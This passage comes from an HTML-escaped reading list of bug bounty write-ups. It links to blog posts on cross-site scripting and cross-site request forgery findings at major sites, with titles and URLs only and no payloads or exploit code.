href=&#34;https://medium.com/@m4shahab1/magic-xss-with-two-parameters-463559b03949&#34;&gt;Magic XSS with two parameters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vpnmentor.com/blog/dom-xss-bug-affecting-tinder-shopify-yelp/&#34;&gt;DOM XSS bug affecting tinder shopify Yelp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jonathanbouman/persistent-xss-unvalidated-open-graph-embed-at-linkedin-com-db6188acedd9&#34;&gt;Persistent XSS unvalidated open graph embed at linkedin.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7&#34;&gt;My first 0day exploit CSP Bypass Reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@brs.sgdc/google-stored-xss-in-payments-350cd7ba0d1b&#34;&gt;Google Stored XSS in payments&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kumar.ninja/2018/09/xss-surveydropboxcom.html&#34;&gt;XSS on dropbox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@rahulraveendran06/weaponizing-xss-attacking-internal-domains-d8ba1cbd106d&#34;&gt;Weaponizing XSS attacking internal domains &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5&#34;&gt;How I XSSed UBER and bypassed CSP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/&#34;&gt;RXSS and CSRF bypass to Account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.bentkowski.info/2018/09/another-xss-in-google-colaboratory.html&#34;&gt;Another XSS in google collaboratory&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@0ktavandi/how-i-bypassed-akamai-kona-waf-xss-in-overstock-com-f205b0e71a0d&#34;&gt;How I bypassed AKAMAI waf in overstock.com &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c&#34;&gt;Reflected XSS at philips.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://randywestergren.com/xss-vulnerabilities-in-multiple-iframe-busters-affecting-top-tier-sites/&#34;&gt;XSS vulnerabilities in multiple iframe busters affecting top tier sites&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0&#34;&gt;Reflected DOM XSS and clickjacking silvergoldbull&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2018/09/stored-xss-vulnerability-in-h1c-private.html&#34;&gt;Stored XSS vulnerability in h1 private&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/&#34;&gt;Authbypass SQLi and XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackerinside.me/2018/09/stored-xss-vulnerability-in-tumblr.html&#34;&gt;Stored XSS vulnerability in tumblr&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/reflected-xss-in-google-code-jam/&#34;&gt;XSS in google code jam&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/08/mapboxxss.html&#34;&gt;Mapbox XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nandwanajatin25/my-first-valid-xss-hackerone-f8ba0a7c647&#34;&gt;My first valid XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://websecblog.com/vulns/stored-xss-in-webcomponents-org/&#34;&gt;Stored XSS in webcomponents.org&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/3-minutes-xss-71e3340ad66b&#34;&gt;3 minutes XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@musabalhussein/icloud-com-dom-based-xss-bugbounty-6f88cb865b18&#34;&gt;icloud.com DOM based XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/xss-at-hubspot-and-xss-in-email-areas-674fa39d5248&#34;&gt;XSS at hubspot and in email areas&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/self-xss-leads-to-blind-xss-and-reflected-xss-950b1dc24647&#34;&gt;Self XSS leads to blind XSS and Reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/reflected-xss-primagames-com-c7a641912626&#34;&gt;Refltected XSS primagames.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@friendly_/stored-xss-in-gameskinny-aa26c6a6ae40&#34;&gt;Stored XSS in gameskinny&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://evanricafort.blogspot.com/2018/08/blind-xss-in-chrome-experiments-google.html&#34;&gt;Blind XSS in Chrome experments Google&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a&#34;&gt;Yahoo two XSSI vulnerabilities chained to steal user information (750$)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@codingkarma/how-i-found-xss-on-amazon-f62b50f1c336&#34;&gt;How I found XSS on amazon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://omespino.com/write-up-telegram-bug-bounty-whatsapp-n-a-blind-xss-stored-ios-in-messengers-twins-who-really-care-about-your-security/&#34;&gt;A blind XSS in messengers twins&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sudhanshur705/xss-in-microsoft-subdomain-81c4e46d6631&#34;&gt;XSS in microsoft Subdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jonathanbouman/persistent-xss-at-ah-nl-198fe7b4c781&#34;&gt;Persistent XSS at ah.nl&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://samcurry.net/the-12000-intersection-between-clickjacking-xss-and-denial-of-service/&#34;&gt;The 12000 intersection betwenn clickjaking , XSS and DOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html&#34;&gt;XSS in google collaboratory CSP bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tahasmily2013m/how-i-found-blind-xss-in-apple-c890775e745a&#34;&gt;How I found blind XSS in apple&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@jonathanbouman/reflected-client-xss-amazon-com-7b0d3cec787&#34;&gt;Reflected XSS on amazon.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@tahasmily2013m/i-have-found-vulnerability-in-360totalsecurity-is-reflected-xss-in-3a6bd602bb5a&#34;&gt;How I found XSS in 360totalsecurity&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@khaled.hassan/the-2-5-btc-stored-xss-f2f9393417f2&#34;&gt;The 2.5 BTC Stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@black_b/vulnerability-netflix-cross-site-scripting-xss-d44010142e2c&#34;&gt;XSS Vulnerability in Netflix &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html&#34;&gt;A story of a UXSS via DOM XSS clickjacking in steam inventory helper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f&#34;&gt;How I found XSS via SSRF vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nc-lp.com/blog/searching-for-xss-found-ldap-injection&#34;&gt;Searching for XSS found ldap injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158&#34;&gt;how I converted SSRF to XSS in a SSRF vulnerable JIRA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/05/reflected-xss-in-hk-yahoo.html&#34;&gt;Reflected XSS in Yahoo subdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.witcoat.com/2018/05/30/account-takeover-and-blind-xss-go-pro-get-bugs/&#34;&gt;Account takeover and blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cybristerboy.blogspot.com/2018/05/how-i-found-5-store-xss-on-private.html&#34;&gt;How I found 5 stored XSS on a private program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/&#34;&gt;Persistent XSS to steal passwords(Paypal)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1&#34;&gt;Self XSS + CSRF to stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ozil.hakim/stored-xss-in-yahoo-and-all-subdomains-bbcaa7c3b8d&#34;&gt;Stored XSS in yahoo and subdomains &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@hacker_eth/xss-in-microsoft-7a70416aee75&#34;&gt;XSS in microsoft&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.hx01.me/2018/05/blind-xss-to-customer-support-panel.html&#34;&gt;Blind XSS at customer support panel&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@newp_th/reflected-xss-on-stack-overflow-b8366a855472&#34;&gt;Reflected XSS on stackoverflow&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@TheShahzada/stored-xss-in-yahoo-b0878ecc97e2&#34;&gt;Stored XSS in Yahoo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nuraalamdipu/xss-403-forbidden-bypass-write-up-e070de52bc06&#34;&gt;XSS 403 forbidden Bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@YoKoKho/turning-self-xss-into-non-self-stored-xss-via-authorization-issue-at-paypal-tech-support-and-brand-3046f52ac16b&#34;&gt;Turning self XSS into non self XSS via authorization issue at paypal&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@prial261/story-of-a-stored-xss-bypass-26e6659f807b&#34;&gt;A story of stored XSS bypass&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.hx01.me/2018/04/mangobaaz-hacked-xss-to-credentials.html&#34;&gt;Mangobaaz hacked XSS to credentials&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e&#34;&gt;How I got stored XSS using file upload&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/bypass-csp-by-abusing-xss-filter-in-edge-43e9106a9754&#34;&gt;Bypassing CSP to abusing XSS filter in edge&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81&#34;&gt;XSS to session Hijacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/04/reflected-xss-on-wwwzomatocom-by.html&#34;&gt;Reflected XSS on www.zomato.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/03/xss-in-subdomain-httpsyefgrantsyahoocom.html&#34;&gt;XSS in subdomain of yahoo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/03/xss-in-sportstwcampaignyahoonet.html&#34;&gt;XSS in yahoo.net subdomain &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/03/reflected-xss-moogaloop-swf-version-62x.html&#34;&gt;Reflected XSS moongaloop swf version 62x&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Alra3ees/google-adwords-3133-7-stored-xss-27bb083b8d27&#34;&gt;Google adwords 3133.7 Stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8&#34;&gt;How I found a surprising XSS vulnerability on oracle netsuite&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd&#34;&gt;Stored XSS on snapchat&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.securitybreached.org/2018/02/02/how-i-was-able-to-bypass-xss-protection-on-hackerones-private-program/&#34;&gt;How I was able to bypass XSS protection on h1 private program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mohamedharon.com/2018/01/reflected-xss-possible-server-side.html&#34;&gt;Reflected XSS possible&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.ibrahimdraidia.com/xss-via-angularjs-template-injection_hostinger/&#34;&gt;XSS via angularjs template injection hostinger&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/microsoft-sharepoints-follow-feature-xss-cve-2017-8514-adesh-kolte-d78d701cd064&#34;&gt;Microsoft follow feature XSS (CVE-2017-8514)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Skylinearafat/xss-protection-bypass-made-my-quickest-bounty-ever-f4fd970c9116&#34;&gt;XSS protection bypass made my quickest bounty ever&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client/&#34;&gt;Taking note XSS to RCE in the simplenote electron client&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@honcbb/vmware-official-vcdx-reflected-xss-90e69a3c35e1&#34;&gt;VMWARE official vcdx reflected XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ansariosama.com/2017/11/how-i-pwned-company-using-idor-blind-xss.html&#34;&gt;How I pwned a company using IDOR and Blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@abdelfattahibrahim/from-recon-to-dom-based-xss-f279602a14cf&#34;&gt;From Recon to DOM based XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&#34;&gt;Local file read via XSS &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/non-persistent-xss-at-microsoft-adesh-kolte-ad36b1b4a325&#34;&gt;Non persistent XSS at microsoft&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/&#34;&gt;A Stored XSS in google (double kill)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saamux/filter-bypass-to-reflected-xss-on-https-finance-yahoo-com-mobile-version-22b854327b27&#34;&gt;Filter bypass to Reflected XSS on finance.yahoo.com (mobile version)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd&#34;&gt;900$ XSS in yahoo : recon wins&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/how-i-bypassed-practos-firewall-and-triggered-a-xss-b30164a8f1dc&#34;&gt;How I bypassed practos firewall and triggered an XSS vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guptashubham.com/stored-xss-to-full-information-disclosure/&#34;&gt;Stored XSS to full information disclosure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html&#34;&gt;Story of parameter specific XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14&#34;&gt;Chaining self XSS with UI redressing leading to session hijacking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@arbazhussain/stored-xss-with-arbitrary-cookie-installation-567931433c7f&#34;&gt;Stored XSS with arbitrary cookie installation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@SyntaxError4/reflective-xss-and-open-redirect-on-indeed-com-subdomain-b4ab40e40c83&#34;&gt;Reflective XSS and Open redirect on indeed.com subdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@SyntaxError4/how-i-found-reflective-xss-in-yahoo-subdomain-3ad4831b386e&#34;&gt;How I found reflected XSS on Yahoo subdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9&#34;&gt;Dont just alert(1) because XSS is more fun&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Alra3ees/my-write-up-about-uber-cross-site-scripting-by-help-of-knoxss-b1b56f8d090&#34;&gt;UBER XSS by helpe of KNOXSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@TheShahzada/reflected-xss-in-yahoo-6e2b6b177448&#34;&gt;Reflected XSS in Yahoo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saamux/reflected-xss-on-www-yahoo-com-9b1857cecb8c&#34;&gt;Reflected XSS on ww.yahoo.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bugbaba.blogspot.com/2017/08/xss-because-of-wrong-content-type-header.html&#34;&gt;XSS because of wrong content type header&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Cross Site Request Forgery (CSRF)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ladysecspeare.wordpress.com/2020/04/05/how-a-simple-csrf-attack-turned-into-a-p1-level-bug/&#34;&gt;How a simple CSRF attack turned into a P1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0&#34;&gt;How I exploited the json csrf with method override technique&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@rajeshranjan457/how-i-csrfd-my-first-bounty-a62b593d3f4d&#34;&gt;How I found CSRF(my first bounty)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa&#34;&gt;Exploiting websocket application wide XSS and CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://fellchase.blogspot.com/2020/02/site-wide-csrf-on-popular-program.html&#34;&gt;Site wide CSRF on popular program&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flex0geek.blogspot.com/2020/02/using-csrf-i-got-weird-account-takeover.html&#34;&gt;Using CSRF I got weird account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@navne3t/csrf-csrf-csrf-f203e6452a9c&#34;&gt;CSRF CSRF CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://santuysec.com/2020/01/21/google-bug-bounty-csrf-in-learndigital-withgoogle-com/&#34;&gt;Google Bugbounty CSRF in learndigital.withgoogle.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@sainttobs/csrf-token-bypasss-a-tale-of-my-2k-bug-ff7f51166ea1&#34;&gt;CSRF token bypass [a tale of 2k bug]&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@vbharad/2-fa-bypass-via-csrf-attack-8f2f6a6e3871&#34;&gt;2FA bypass via CSRF attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d&#34;&gt;Stored iframe injection CSRF account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.darabi.me/2019/12/instagram-delete-media-csrf.html&#34;&gt;Instagram delete media CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://smaranchand.com.np/2019/10/an-inconsistent-csrf/&#34;&gt;An inconsistent CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40&#34;&gt;Bypass CSRF with clickjacking worth 1250&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rafiem.github.io/bugbounty/tokopedia/site-wide-csrf-graphql/&#34;&gt;Sitewide CSRF graphql&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@shub66452/account-takeover-using-csrf-json-based-a0e6efd1bffc&#34;&gt;Account takeover using CSRF json based&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441&#34;&gt;CORS to CSRF attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@nishantrustlingup/my-first-csrf-to-account-takeover-worth-750-1332641d4304&#34;&gt;My first CSRF to account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986&#34;&gt;4x chained CSRFs chained for account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f&#34;&gt;CSRF can lead to stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2019/04/yet-other-examples-of-abusing-csrf-in-logout/&#34;&gt;Yet other examples of abusing CSRF in logout&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-csrf-to-rce/&#34;&gt;Wordpress CSRF to RCE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c&#34;&gt;Bruteforce user IDs via CSRF to delete all the users with CSRF attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mr_hacker/csrf-bypass-using-cross-frame-scripting-c349d6f33eb6&#34;&gt;CSRF Bypass using cross frame scripting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/lintern-ute-account-takeover-via-csrf-adesh-kolte-307f7065ee74&#34;&gt;Account takeover via CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276&#34;&gt;A very useful technique to bypass the CSRF protection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b&#34;&gt;CSRF account takeover exlpained automated manual bugbounty&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/csrf-account-takeover-in-a-company-worth-1b-6e966813c262&#34;&gt;CSRF to account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@adeshkolte/how-i-got-500-from-microsoft-for-csrf-vulnerability-700accaf48b9&#34;&gt;How I got 500USD from microsoft for CSRF vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c&#34;&gt;Critical Bypass CSRF protection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/&#34;&gt;RXSS CSRF bypass to full account takeover&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.sagarvd.me/2018/09/youtube-csrf.html&#34;&gt;Youtube CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1&#34;&gt;Self XSS + CSRF = Stored XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@YoKoKho/ribose-idor-with-simple-csrf-bypass-unrestricted-changes-and-deletion-to-other-photo-profile-e4393305274e&#34;&gt;Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0&#34;&gt;JSON CSRF attack on a social networking site&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf&#34;&gt;Hacking facebook oculus integration CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&#34;&gt;Amazon leaking CSRF token using service worker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://philippeharewood.com/facebook-graphql-csrf/&#34;&gt;Facebook graphql CSRF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@armaanpathan/chain-the-vulnerabilities-and-take-your-report-impact-on-the-moon-csrf-to-html-injection-which-608fa6e74236&#34;&gt;Chain the vulnerabilities and take your report impact on the moon csrf to html injection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2&#34;&gt;Partial CSRF to Full 